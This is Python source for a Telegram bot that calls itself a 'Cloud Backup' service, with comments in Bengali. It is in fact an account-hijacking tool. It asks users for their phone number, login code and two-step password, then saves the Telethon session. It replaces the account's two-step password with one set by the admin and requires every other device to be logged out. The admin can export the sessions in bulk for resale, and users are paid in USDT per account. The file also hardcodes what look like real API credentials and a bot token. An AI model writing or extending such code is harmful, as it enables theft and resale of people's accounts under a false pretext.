import os
import asyncio
import json
import shutil
import zipfile
import sys
from datetime import datetime
from threading import Thread
from flask import Flask, render_template_string
import telebot
from telebot import types
from telethon import TelegramClient, functions, types as tl_types
from telethon.errors import SessionPasswordNeededError

# ==================== কোর এডমিন কনফিগারেশন ====================
API_ID = 36547444
API_HASH = "119a3ac4fd3dc368df92ae6d81f3bb3e"
BOT_TOKEN = "8970655570:AAGb0C4KmwkOzUxHNA29O6SHfJ2omqrUMJ4"
ADMIN_ID = 8095751648
# =========================================================

BASE_STORAGE_DIR = "user_backups"
DB_FILE = "user_database.json"
SETTINGS_FILE = "bot_settings.json"

if not os.path.exists(BASE_STORAGE_DIR):
    try: os.makedirs(BASE_STORAGE_DIR, exist_ok=True)
    except: pass

DEFAULT_SETTINGS = {
    "security_password": "MySecureBotPassword123",
    "country_prices": {"52": 0.51, "60": 0.47, "49": 0.90, "54": 0.50, "880": 0.15, "57": 0.24},
    "country_capacity": {"52": 9965982, "60": 100, "49": 838, "54": 500, "880": 50, "57": 100},
    "country_delays": {"52": 600, "60": 600, "49": 600, "54": 600, "880": 600, "57": 600}
}

# ==================== ডাটাবেস কন্ট্রোলার ====================
def load_settings():
    if os.path.exists(SETTINGS_FILE):
        try:
            with open(SETTINGS_FILE, "r") as f:
                loaded = json.load(f)
                for key in DEFAULT_SETTINGS:
                    if key not in loaded: loaded[key] = DEFAULT_SETTINGS[key]
                return loaded
        except: return DEFAULT_SETTINGS
    return DEFAULT_SETTINGS

def save_settings(settings):
    try:
        with open(SETTINGS_FILE, "w") as f: json.dump(settings, f, indent=4)
    except: pass

def load_db():
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: return json.load(f)
        except: return {}
    return {}

def save_db(db):
    try:
        with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)
    except: pass

def is_number_already_verified(phone_number):
    db = load_db()
    # ডাটাবেসে ভেরিফাইড লিস্ট ট্র্যাকিংয়ের জন্য
    if "verified_numbers" not in db:
        db["verified_numbers"] = []
        save_db(db)
    return phone_number in db["verified_numbers"]

def add_to_verified_numbers(phone_number):
    db = load_db()
    if "verified_numbers" not in db: db["verified_numbers"] = []
    if phone_number not in db["verified_numbers"]:
        db["verified_numbers"].append(phone_number)
    save_db(db)

def get_user_stats(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db:
        db[uid] = {"verified": 0, "unverified": 0, "pending_balance": 0.0, "verified_balance": 0.0}
        save_db(db)
    else:
        if "pending_balance" not in db[uid]: db[uid]["pending_balance"] = 0.0
        if "verified_balance" not in db[uid]: db[uid]["verified_balance"] = db[uid].get("balance", 0.0)
    return db[uid]

def add_user_pending_account(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid not in db: get_user_stats(user_id); db = load_db()
    db[uid]["unverified"] += 1
    db[uid]["pending_balance"] = round(db[uid]["pending_balance"] + amount, 2)
    save_db(db)

def convert_pending_to_verified(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid in db:
        if db[uid]["unverified"] > 0: db[uid]["unverified"] -= 1
        db[uid]["verified"] += 1
        db[uid]["pending_balance"] = max(0.0, round(db[uid]["pending_balance"] - amount, 2))
        db[uid]["verified_balance"] = round(db[uid]["verified_balance"] + amount, 2)
        save_db(db)

def reject_pending_account(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid in db:
        if db[uid]["unverified"] > 0: db[uid]["unverified"] -= 1
        db[uid]["pending_balance"] = max(0.0, round(db[uid]["pending_balance"] - amount, 2))
        save_db(db)

def get_current_file_count(country_code):
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir): return 0
    try: return len([f for f in os.listdir(target_dir) if f.endswith(".session")])
    except: return 0

# ==================== FLASK SERVER ====================
app = Flask("UptimeServer")

@app.route('/')
def home():
    settings = load_settings()
    total_sessions = 0
    country_list_html = ""
    for code in settings["country_prices"]:
        count = get_current_file_count(code)
        total_sessions += count
        cap = settings["country_capacity"].get(code, "No Limit")
        country_list_html += f"<tr><td><b>+{code}</b></td><td>{count} / {cap}</td><td>${settings['country_prices'][code]}</td></tr>"

    html_template = f"""
    <!DOCTYPE html><html><head><title>Dashboard</title><meta name="viewport" content="width=device-width, initial-scale=1"><style>body {{ font-family: sans-serif; background-color: #0f172a; color: #f8fafc; text-align: center; padding: 40px 20px; }} .card {{ background: #1e293b; max-width: 450px; margin: auto; padding: 25px; border-radius: 10px; border: 1px solid #334155; }} h1 {{ color: #38bdf8; }} table {{ width: 100%; margin-top: 15px; text-align: left; }} th, td {{ padding: 8px; border-bottom: 1px solid #334155; }}</style></head>
    <body><div class="card"><h2 style="color:#10b981;">● SERVER ONLINE</h2><h1>Cloud Backup Bot</h1><p>Total Saved Sessions: <b>{total_sessions}</b></p><table><tr><th>Country</th><th>Used/Cap</th><th>Price</th></tr>{country_list_html}</table></div></body></html>
    """
    return render_template_string(html_template)

def run_flask():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)

# ==================== TELEGRAM BOT CORE ====================
bot = telebot.TeleBot(BOT_TOKEN, parse_mode="Markdown")
user_data = {}
admin_state = {}

bot_loop = asyncio.new_event_loop()
def start_async_loop(loop):
    asyncio.set_event_loop(loop)
    loop.run_forever()

Thread(target=start_async_loop, args=(bot_loop,), daemon=True).start()

def check_valid_country_and_get_code(phone_number):
    clean = phone_number.replace("+", "").replace(" ", "")
    settings = load_settings()
    sorted_codes = sorted(settings["country_prices"].keys(), key=len, reverse=True)
    for code in sorted_codes:
        if clean.startswith(code): return code
    return None

@bot.message_handler(commands=['start'])
def cmd_start(message):
    bot.send_message(message.chat.id, "👋 **Welcome to Cloud Backup Telegram Bot**\n\nTo start a secure backup of your Telegram Account, please send your phone number with your country code.\nExample: `+88017XXXXXXXX` or `+52XXXXXXXXXX`")

@bot.message_handler(commands=['cancel'])
def cmd_cancel(message):
    user_id = message.from_user.id
    if user_id in user_data:
        try: asyncio.run_coroutine_threadsafe(user_data[user_id]["client"].disconnect(), bot_loop)
        except: pass
        del user_data[user_id]
    bot.send_message(message.chat.id, "❌ **Cancelled.**\n\nYou can send a new phone number to start again.")

@bot.message_handler(commands=['capacity'])
def cmd_capacity(message):
    settings = load_settings()
    response = f"👍 **Available Countries : ({len(settings['country_prices'])})**:\n\n"
    for code in settings["country_prices"]:
        prc = settings["country_prices"][code]
        cap = settings["country_capacity"].get(code, 999)
        delay = settings.get("country_delays", {}).get(code, 60)
        response += f"🌍 **+{code}**\nFree:${prc}|New:${prc}|Spam:${prc}|Perm:${prc}|{cap}|{delay}s\n\n"
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['account'])
def cmd_account(message):
    user_id = message.from_user.id
    stats = get_user_stats(user_id)
    current_time = datetime.now().strftime("%m/%d/%y")
    current_clock = datetime.now().strftime("%H:%M:%S")
    response = (
        f"👤 **ID : {user_id}**\n\n"
        f"✅ Number of verified accounts : {stats['verified']}\n"
        f"⏳ Number of unverified accounts : {stats['unverified']}\n"
        f"🅈 Total Verified Balance : {stats['verified_balance']:.2f} USDT\n"
        f"⏳ Total Pending Balance : {stats['pending_balance']:.2f} USDT\n\n"
        f"📅 Date : {current_time}\n"
        f"🕐 Time : {current_clock} ( NZ Time )\n\n"
        f"✍️ *Note : You Can Only Withdraw Your Verified Balance.*\n\n/withdraw"
    )
    bot.send_message(message.chat.id, response)

# ==================== উইথড্রয়াল সিস্টেম ====================
@bot.message_handler(commands=['withdraw'])
def cmd_withdraw(message):
    user_id = message.from_user.id
    stats = get_user_stats(user_id)
    
    if stats['verified'] < 1 or stats['verified_balance'] <= 0.0:
        bot.send_message(message.chat.id, "⚠️ **Minimum withdrawal condition is at least 1 verified account and valid balance.**")
        return
        
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("💳 Withdraw Card", callback_data="wtd_card"),
        types.InlineKeyboardButton("🪙 USDT (BEP-20)", callback_data="wtd_bep20")
    )
    bot.send_message(message.chat.id, "⚡ **Choose Your Withdrawal Method Below:**", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("wtd_"))
def handle_withdraw_selection(call):
    user_id = call.from_user.id
    bot.delete_message(call.message.chat.id, call.message.message_id)
    
    if call.data == "wtd_card":
        bot.send_message(call.message.chat.id, "💳 **Send your card info:**")
        admin_state[user_id] = "wait_wtd_card"
    elif call.data == "wtd_bep20":
        bot.send_message(call.message.chat.id, "🪙 **Send your USDT BEP-20 Address:**\n\n⚠️ *Must be 42 characters long and start with '0x'*")
        admin_state[user_id] = "wait_wtd_bep20"

# ==================== এডমিন সেশন এক্সপোর্টার ====================
@bot.message_handler(commands=['export'])
def cmd_export_sessions(message):
    if message.from_user.id != ADMIN_ID: return
    args = message.text.split()
    if len(args) < 3:
        bot.reply_to(message, "⚠️ **Format:** `/export <country_code> <amount>`")
        return
        
    country_code = args[1].replace("+", "").strip()
    try: amount = int(args[2])
    except: return
        
    target_dir = os.path.join(BASE_STORAGE_DIR, country_code)
    if not os.path.exists(target_dir):
        bot.reply_to(message, f"❌ No sessions for `+{country_code}`")
        return
        
    all_files = [f for f in os.listdir(target_dir) if f.endswith(".session")]
    all_files.sort(key=lambda x: os.path.getmtime(os.path.join(target_dir, x)), reverse=True)
    
    selected_files = all_files[:amount]
    if not selected_files:
        bot.reply_to(message, "❌ No files found.")
        return
        
    zip_filename = f"Export_{country_code}.zip"
    try:
        with zipfile.ZipFile(zip_filename, 'w') as zipf:
            for file in selected_files:
                zipf.write(os.path.join(target_dir, file), arcname=file)
                jrnl = file + "-journal"
                if os.path.exists(os.path.join(target_dir, jrnl)):
                    zipf.write(os.path.join(target_dir, jrnl), arcname=jrnl)
                    
        with open(zip_filename, 'rb') as doc:
            bot.send_document(message.chat.id, doc, caption=f"📦 Exported {len(selected_files)} sessions.")
        os.remove(zip_filename)
    except Exception as e: bot.reply_to(message, f"❌ Error: {e}")

# ==================== এডমিন কন্ট্রোল প্যানেল ====================
@bot.message_handler(commands=['panel'])
def admin_panel_command(message):
    if message.from_user.id != ADMIN_ID: return
    settings = load_settings()
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(types.InlineKeyboardButton("🔐 Change 2FA Password", callback_data="pnl_pass"), types.InlineKeyboardButton("🌍 Set Country (All-in-One)", callback_data="pnl_set_country"))
    markup.add(types.InlineKeyboardButton("📂 All Session Files", callback_data="pnl_all_files"), types.InlineKeyboardButton("❌ Close Panel", callback_data="pnl_close"))
    
    panel_msg = f"🛠 *Master Admin Control Panel*\n\n🔐 *Default 2FA Password:* `{settings['security_password']}`\n\n📈 *Allowed Countries:*\n"
    for code in settings["country_prices"]:
        panel_msg += f"• 🌍 `+{code}` ➜ Price: **${settings['country_prices'][code]}** | Cap: **{settings['country_capacity'].get(code, 100)}**\n"
    bot.send_message(message.chat.id, panel_msg, reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith("pnl_"))
def handle_admin_callbacks(call):
    if call.from_user.id != ADMIN_ID: return
    if call.data == "pnl_close":
        bot.delete_message(call.message.chat.id, call.message.message_id)
    elif call.data == "pnl_pass":
        bot.send_message(call.message.chat.id, "🔐 **Please enter the new default 2FA password:**")
        admin_state[call.from_user.id] = "wait_pass"
    elif call.data == "pnl_set_country":
        bot.send_message(call.message.chat.id, "🌍 *Set Country Parameters (All-In-One)*\nFormat: `Code=Price=Capacity=DelayTime`")
        admin_state[call.from_user.id] = "wait_country_all"
    elif call.data == "pnl_all_files":
        settings = load_settings()
        file_msg = "📂 *Live Country Session Files Count:*\n\n"
        for code in settings["country_prices"]:
            count = get_current_file_count(code)
            file_msg += f"• 🌍 Country `+{code}` ➜ **{count} Pcs** Active\n"
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("⬅️ Back", callback_data="pnl_back"))
        bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=file_msg, reply_markup=markup)
    elif call.data == "pnl_back":
        bot.delete_message(call.message.chat.id, call.message.message_id)
        admin_panel_command(call.message)

# ==================== টেক্সট মেসেজ ও ইনপুট হ্যান্ডলার ====================
@bot.message_handler(func=lambda message: True)
def handle_text(message):
    user_id = message.from_user.id
    text = message.text.strip()
    
    if user_id in admin_state:
        state = admin_state[user_id]
        
        if state == "wait_wtd_card":
            del admin_state[user_id]
            stats = get_user_stats(user_id)
            bot.reply_to(message, "✅ **Your Card withdrawal request has been submitted!**")
            bot.send_message(ADMIN_ID, f"📥 **Withdraw Card!**\n👤 User: `{user_id}`\n💰 Amount: {stats['verified_balance']} USDT\n💳 Info: {text}")
            return
            
        elif state == "wait_wtd_bep20":
            if len(text) != 42 or not text.startswith("0x"):
                bot.reply_to(message, "❌ **Invalid BEP-20 Address!** Must be 42 chars long and start with **0x**.")
                del admin_state[user_id]
                return
            del admin_state[user_id]
            stats = get_user_stats(user_id)
            bot.reply_to(message, "✅ **Your USDT (BEP-20) withdrawal request has been submitted!**")
            bot.send_message(ADMIN_ID, f"📥 **Withdraw BEP20!**\n👤 User: `{user_id}`\n💰 Amount: {stats['verified_balance']} USDT\n🪙 Addr: `{text}`")
            return

        if user_id == ADMIN_ID:
            settings = load_settings()
            del admin_state[user_id]
            try:
                if state == "wait_pass":
                    settings["security_password"] = text
                    save_settings(settings)
                    bot.reply_to(message, f"✅ Updated: `{text}`")
                elif state == "wait_country_all":
                    parts = text.split("=")
                    code = parts[0].strip().replace("+", "")
                    settings["country_prices"][code] = float(parts[1].strip())
                    settings["country_capacity"][code] = int(parts[2].strip())
                    if "country_delays" not in settings: settings["country_delays"] = {}
                    settings["country_delays"][code] = int(parts[3].strip())
                    save_settings(settings)
                    bot.reply_to(message, f"✅ Country `+{code}` updated.")
            except Exception as e: bot.reply_to(message, f"❌ Error: {e}")
            return

    # ওটিপি / পাসওয়ার্ড সাবমিট হ্যান্ডলার
    if user_id in user_data and ("phone_code_hash" in user_data[user_id] or user_data[user_id].get("waiting_for_password")):
        asyncio.run_coroutine_threadsafe(verify_otp_task(text, user_id, message), bot_loop)
        return

    # ফোন নম্বর ইনপুট ডিটেকশন
    if text.startswith("+") or text.isdigit():
        phone = text if text.startswith("+") else f"+{text}"
        clean_phone = phone.replace("+", "").replace(" ", "")
        
        # [ডুপ্লিকেট নম্বর প্রটেকশন চেক] - ছবি ১ রিকোয়ারমেন্ট
        if is_number_already_verified(clean_phone):
            bot.reply_to(message, "❌ This number already exists. Try another number.")
            return
            
        matched_code = check_valid_country_and_get_code(phone)
        if not matched_code:
            bot.reply_to(message, "❗you cannot at account from country.")
            return
            
        processing_msg = bot.reply_to(message, "🔄 Processing please wait...")
        asyncio.run_coroutine_threadsafe(send_otp_task(phone, matched_code, user_id, message, processing_msg), bot_loop)
    else:
        bot.reply_to(message, "❌ Invalid Format. Use /start to reset.")

# ==================== TELETHON ASYNC BACKEND ====================
async def send_otp_task(phone_number, country_code, user_id, message, processing_msg):
    settings = load_settings()
    if get_current_file_count(country_code) >= settings["country_capacity"].get(country_code, 9999):
        bot.edit_message_text(f"❌ Capacity Over!", message.chat.id, processing_msg.message_id)
        return
    
    clean_phone = phone_number.replace("+", "").replace(" ", "")
    final_session_path = os.path.join(BASE_STORAGE_DIR, country_code, f"+{clean_phone}")
    os.makedirs(os.path.dirname(final_session_path), exist_ok=True)
    
    user_client = TelegramClient(final_session_path, API_ID, API_HASH, base_logger='critical')
    try:
        await user_client.connect()
        sent_code = await user_client.send_code_request(phone_number)
        user_data[user_id] = {
            "client": user_client, "phone": phone_number, 
            "phone_code_hash": sent_code.phone_code_hash, "clean_phone": clean_phone, 
            "session_path": final_session_path, "country_code": country_code,
            "has_existing_2fa": False
        }
        bot.edit_message_text(f"🔢 Enter the code sent to the number or send the message.\n\n🇨🇴 ( `{phone_number}` )\n\n🦤 /cancel", message.chat.id, processing_msg.message_id)
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {e}", message.chat.id, processing_msg.message_id)

async def verify_otp_task(text, user_id, message):
    data = user_data[user_id]
    settings = load_settings()
    
    # ইউজার যদি ২এফএ পাসওয়ার্ড সাবমিট করে
    if data.get("waiting_for_password"):
        try:
            # প্রথমে ইউজারের এক্সিস্টিং পাসওয়ার্ড দিয়ে সাইন ইন করা
            await data["client"].sign_in(password=text)
            
            # [টেলিগ্রাম রিয়েল টু-স্টেপ ভেরিফিকেশন আপডেট লজিক]
            # সাইন ইন সফল হলে সাথে সাথেই এডমিনের মাস্টার পাসওয়ার্ডটি দিয়ে একাউন্টের টু-স্টেপ চেঞ্জ/আপডেট করা
            try:
                await data["client"](functions.account.UpdatePasswordSettingsRequest(
                    password=tl_types.InputCheckPasswordEmpty(),
                    new_settings=tl_types.PasswordInputSettings(
                        new_password=settings["security_password"], 
                        hint="Cloud Lock"
                    )
                ))
            except Exception as e:
                # যদি ওল্ড পাসওয়ার্ড রিকোয়ার করে (ইনপুট চেকপাসওয়ার্ডএম্পটি ফেইল করলে)
                try:
                    # কারেন্ট পাসওয়ার্ড হ্যাশ জেনারেট করে আপডেট করা
                    pwd_info = await data["client"](functions.account.GetPasswordRequest())
                    my_hash = functions.account.PasswordInputSettings(new_password=settings["security_password"], hint="Cloud Lock")
                    await data["client"](functions.account.UpdatePasswordSettingsRequest(password=pwd_info, new_settings=my_hash))
                except: pass
                
            await process_backup(user_id, message, data)
            del user_data[user_id]
        except Exception as e: 
            bot.reply_to(message, f"❌ Password Error: {e}")
    else:
        # ওটিপি সাইন ইন ট্রাই
        try:
            await data["client"].sign_in(data["phone"], text, phone_code_hash=data["phone_code_hash"])
            
            # ওটিপি সাকসেস এবং ২এফএ নেই -> ডাইরেক্ট এডমিনের মাস্টার পাসওয়ার্ড টু-স্টেপে সেট করা
            try:
                await data["client"](functions.account.UpdatePasswordSettingsRequest(
                    password=tl_types.InputCheckPasswordEmpty(),
                    new_settings=tl_types.PasswordInputSettings(
                        new_password=settings["security_password"], 
                        hint="Cloud Lock"
                    )
                ))
            except: pass
            
            await process_backup(user_id, message, data)
            del user_data[user_id]
        except SessionPasswordNeededError:
            # অ্যাকাউন্টে আগে থেকে ২এফএ পাসওয়ার্ড লাগানো আছে, তাই ইউজারের থেকে চাওয়া হচ্ছে
            bot.reply_to(message, "🔐 Two-step verification active. Enter Password:")
            user_data[user_id]["waiting_for_password"] = True
        except Exception as e: 
            bot.reply_to(message, f"❌ OTP Error: {e}")

async def process_backup(user_id, message, data):
    settings = load_settings()
    delay = settings.get("country_delays", {}).get(data['country_code'], 600)
    price = settings["country_prices"].get(data['country_code'], 0.24)
    
    # ইনিশিয়ালি টাকাটি ইউজারের পেন্ডিং ও আন-ভেরিফাইড ড্যাশবোর্ডে যোগ হলো
    add_user_pending_account(user_id, price)
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(f"✅ Account Verification {price}", callback_data="none"))
    bot.reply_to(message, f"✅ The account number `{data['phone']}` was successfully received\n\n❗ You have to wait {delay} seconds time to confirm the account, please log out\n\n👇 The bot will automatically verify your account\n\n🏷️ Spam Status : 🕊️ Free As Bird", reply_markup=markup)
    
    # প্রথম নির্দিষ্ট টাইমার পর্যন্ত অপেক্ষা
    await asyncio.sleep(delay)
    
    max_wait_extended = 3600  # অতিরিক্ত ১ ঘণ্টা ডিভাইস ক্লিয়ার করার সুযোগ (ছবি ২ লজিক)
    interval = 60             # প্রতি ৬০ সেকেন্ড পর পর ব্যাকগ্রাউন্ড চেক লুপ
    elapsed = 0
    
    while elapsed <= max_wait_extended:
        try:
            await data["client"].connect()
            if not await data["client"].is_user_authorized():
                reject_pending_account(user_id, price)
                return
                
            auths = await data["client"](functions.account.GetAuthorizationsRequest())
            other_devices = [a for a in auths.authorizations if not a.current]
            
            # যদি অন্য কোনো ডিভাইস না থাকে (শুধু বটের নিজস্ব সেশনটিই একটিভ আছে) -> CLAIM SUCCESS
            if len(other_devices) == 0:
                await data["client"].disconnect()
                convert_pending_to_verified(user_id, price)
                add_to_verified_numbers(data["clean_phone"]) # ডুপ্লিকেট লিস্টে নম্বর লক করা হলো
                bot.send_message(message.chat.id, f"🎉 **Account {data['phone']} confirmed!** Balance moved to Verified.")
                bot.send_message(ADMIN_ID, f"🔔 **New Verified Session Saved:** `{data['phone']}`")
                return
            else:
                # যদি অন্য ডিভাইস থাকে এবং এটিই প্রথম চেক হয়, ইউজারকে ওয়ার্নিং এলার্ট দেওয়া (ছবি ২ এর মতো)
                if elapsed == 0:
                    bot.send_message(message.chat.id, f"⚠️ **Device Detected on `{data['phone']}`!**\n\nYour account has other active sessions. You have **1 hour** to clear all other devices from Telegram Settings and keep only this robot session, or it will be rejected.")
            
            await data["client"].disconnect()
        except:
            pass
            
        await asyncio.sleep(interval)
        elapsed += interval

    # ১ ঘণ্টার মধ্যেও যদি ইউজার সেশন ক্লিয়ার না করে, রিজেক্ট করা হবে এবং টাকা আন-ভেরিফাইডেই থেকে যাবে
    reject_pending_account(user_id, price)
    bot.send_message(message.chat.id, f"❌ **Verification Failed!** You did not clear other devices within 1 hour for `{data['phone']}`. Account rejected.")

# ==================== মেইন থ্রেড রানার ====================
if __name__ == "__main__":
    flask_thread = Thread(target=run_flask, daemon=True)
    flask_thread.start()
    bot.infinity_polling(skip_pending=True)
